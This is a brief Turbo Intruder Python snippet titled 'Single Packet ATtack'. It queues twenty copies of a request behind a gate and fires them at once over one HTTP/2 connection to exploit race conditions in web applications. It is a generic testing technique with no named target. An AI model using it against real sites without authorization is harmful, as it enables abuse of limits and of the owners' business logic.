# Single Packet ATtack
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )
    
    # queue 20 requests in gate '1'
    for i in range(20):
        engine.queue(target.req, gate='1')
    
    # send all requests in gate '1' in parallel
    engine.openGate('1')
```
